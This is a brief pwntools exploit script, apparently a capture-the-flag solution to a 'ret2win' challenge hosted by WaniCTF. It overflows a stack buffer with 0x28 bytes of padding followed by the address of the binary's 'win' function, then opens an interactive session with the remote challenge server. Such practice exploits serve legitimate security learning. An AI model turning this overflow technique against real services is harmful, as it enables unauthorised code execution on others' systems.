from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./chall')

p = process('./chall')
p = remote('ret2win-pwn.wanictf.org', '9003')
payload = b'a' * 0x28 + p64(elf.sym['win'])
p.sendafter(b'your input (max. 48 bytes) > ', payload)

p.interactive()